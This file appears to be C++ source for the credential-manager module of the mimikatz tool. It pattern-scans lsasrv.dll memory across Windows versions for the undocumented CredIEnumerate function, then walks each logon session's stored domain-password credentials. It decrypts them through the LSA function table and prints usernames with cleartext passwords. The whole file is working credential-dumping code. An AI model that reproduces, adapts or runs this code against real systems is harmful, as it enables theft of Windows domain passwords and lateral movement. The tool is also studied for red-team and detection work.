/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence    : http://creativecommons.org/licenses/by-nc-sa/3.0/fr/
	Ce fichier : http://creativecommons.org/licenses/by/3.0/fr/
*/
#include "credman.h"

PCRED_I_ENUMERATE CredIEnumerate = NULL;

bool searchCredmanFuncs()
{
#ifdef _M_X64
	BYTE PTRN_WNO8_CrediEnumerate[]= {0x48, 0x81, 0xec, 0xd0, 0x00, 0x00, 0x00, 0x33, 0xc0, 0x45, 0x33, 0xed};
	LONG OFFS_WNO8_CrediEnumerate	= -22;
	BYTE PTRN_WIN8_CrediEnumerate[]= {0x48, 0x81, 0xec, 0xe0, 0x00, 0x00, 0x00, 0x33, 0xc0, 0x45, 0x33, 0xed};
	LONG OFFS_WIN8_CrediEnumerate	= -30;
#elif defined _M_IX86
	BYTE PTRN_WN60_CrediEnumerate[]	= {0x8b, 0xff, 0x55, 0x8b, 0xec, 0x83, 0xec, 0x40, 0x33, 0xc9};
	BYTE PTRN_WN61_CrediEnumerate[]	= {0x8b, 0xff, 0x55, 0x8b, 0xec, 0x83, 0xec, 0x44, 0x33, 0xc0};
	BYTE PTRN_WN62_CrediEnumerate[]	= {0x8b, 0xff, 0x55, 0x8b, 0xec, 0x81, 0xec, 0x80, 0x00, 0x00, 0x00, 0x33, 0xc0};
	LONG OFFS_WALL_CrediEnumerate	= 0;
#endif

	if(!CredIEnumerate && mod_system::GLOB_Version.dwBuildNumber >= 6000)
	{
		PBYTE pattern = NULL; ULONG taille = 0; LONG offset = 0;
#ifdef _M_X64
		if (mod_system::GLOB_Version.dwMinorVersion < 2)
		{
			pattern	= PTRN_WNO8_CrediEnumerate;
			taille	= sizeof(PTRN_WNO8_CrediEnumerate);
			offset = OFFS_WNO8_CrediEnumerate;
		}
		else
		{
			pattern	= PTRN_WIN8_CrediEnumerate;
			taille	= sizeof(PTRN_WIN8_CrediEnumerate);
			offset = OFFS_WIN8_CrediEnumerate;
		}
#elif defined _M_IX86
		if(mod_system::GLOB_Version.dwMinorVersion < 1)
		{
			pattern	= PTRN_WN60_CrediEnumerate;
			taille	= sizeof(PTRN_WN60_CrediEnumerate);
		}
		else if (mod_system::GLOB_Version.dwMinorVersion < 2)
		{
			pattern	= PTRN_WN61_CrediEnumerate;
			taille	= sizeof(PTRN_WN61_CrediEnumerate);
		}
		else
		{
			pattern	= PTRN_WN62_CrediEnumerate;
			taille	= sizeof(PTRN_WN62_CrediEnumerate);
		}
		offset = OFFS_WALL_CrediEnumerate;
#endif
		mod_memory::genericPatternSearch(reinterpret_cast<PBYTE *>(&CredIEnumerate), L"lsasrv", pattern, taille, offset, NULL, true, true);
	}
	return (searchLSAFuncs() && CredIEnumerate);
}

__kextdll bool __cdecl getCredmanFunctions(mod_pipe * monPipe, vector<wstring> * mesArguments)
{
	wostringstream monStream;
	monStream << L"** lsasrv.dll ** ; Statut recherche : " << (searchCredmanFuncs() ? L"OK :)" : L"KO :(") << endl << endl <<
		L"@CredIEnumerate     = " << CredIEnumerate << endl <<
		L"@LsaUnprotectMemory = " << SeckPkgFunctionTable->LsaUnprotectMemory << endl;
	return sendTo(monPipe, monStream.str());
}

__kextdll bool __cdecl getCredman(mod_pipe * monPipe, vector<wstring> * mesArguments)
{
	vector<pair<PFN_ENUM_BY_LUID, wstring>> monProvider;
	monProvider.push_back(make_pair<PFN_ENUM_BY_LUID, wstring>(getCredmanData, wstring(L"credman")));
	return getLogonData(monPipe, mesArguments, &monProvider);
}

bool WINAPI getCredmanData(__in PLUID logId, __in mod_pipe * monPipe, __in bool justSecurity)
{
	wostringstream message;
	if(searchCredmanFuncs())
	{
		DWORD credNb = 0;
		PCREDENTIAL * pCredential = NULL;
		NTSTATUS status = (mod_system::GLOB_Version.dwMinorVersion < 2) ? CredIEnumerate(logId, 0, NULL, CRED_ENUMERATE_ALL_CREDENTIALS, &credNb, &pCredential) : reinterpret_cast<PCRED_I_ENUMERATE62>(CredIEnumerate)(logId, NULL, CRED_ENUMERATE_ALL_CREDENTIALS, &credNb, &pCredential);

		if(NT_SUCCESS(status))
		{
			for(DWORD i = 0; i < credNb; i++)
			{
				if(pCredential[i]->Type == CRED_TYPE_DOMAIN_PASSWORD)
				{
					wstring Target(pCredential[i]->TargetName), Sheduler(L"Domain:batch=TaskScheduler:Task:");
					wstring ShortTarget = Target.substr(Target.find_first_of(L'=') + 1);
					
					message << endl;
					if(justSecurity)
						message << L"\t [" << i << L"] " << ShortTarget << L'\t';
					else message <<
						L"\t * [" << i << L"] Target   : " << pCredential[i]->TargetName << L" / " << (pCredential[i]->TargetAlias ? pCredential[i]->TargetAlias : L"<NULL>") << endl <<
						L"\t * [" << i << L"] Comment  : " << (pCredential[i]->Comment ? pCredential[i]->Comment : L"<NULL>") << endl <<
						L"\t * [" << i << L"] User     : " << pCredential[i]->UserName << endl;
					
					DWORD Flags = 0;
					if (Target.compare(0, Sheduler.length(), Sheduler) == 0)
						Flags = 0x4000 | CRED_TI_USERNAME_TARGET;

					CREDENTIAL_TARGET_INFORMATION mesInfos = {const_cast<wchar_t *>(ShortTarget.c_str()), NULL, NULL, NULL, NULL, NULL, NULL, Flags, 0 , NULL};
					DWORD dwNbCredentials;
					PENCRYPTED_CREDENTIALW * pCredential;
					NTSTATUS status = SeckPkgFunctionTable->CrediReadDomainCredentials(logId, CREDP_FLAGS_IN_PROCESS, &mesInfos, 0, &dwNbCredentials, &pCredential);
					if(NT_SUCCESS(status))
					{
						for(DWORD j = 0; j < dwNbCredentials ; j++)
						{
							LSA_UNICODE_STRING encryptedPassword = {pCredential[j]->Cred.CredentialBlobSize, pCredential[j]->Cred.CredentialBlobSize, reinterpret_cast<PWSTR>(pCredential[j]->Cred.CredentialBlob)};
							wstring cred = getPasswordFromProtectedUnicodeString(&encryptedPassword);
							
							if(justSecurity)
								message << L"- {" << pCredential[j]->Cred.UserName << L" ; " << cred << L" } ";
							else message <<
									L"\t       [" << j << L"] User : " << pCredential[j]->Cred.UserName << endl <<
									L"\t       [" << j << L"] Cred : " << cred << endl;
						}
						SeckPkgFunctionTable->CrediFreeCredentials(dwNbCredentials, pCredential);
					}
					else message << L"Erreur CrediReadDomainCredentials : " << mod_system::getWinError(false, status);
				}
			}
			CredFree(pCredential);
		}
		else message << L"CredIEnumerate KO : " << mod_system::getWinError(false, status);
	} else message << L"n.a. (credman KO)";
	return sendTo(monPipe, message.str());
}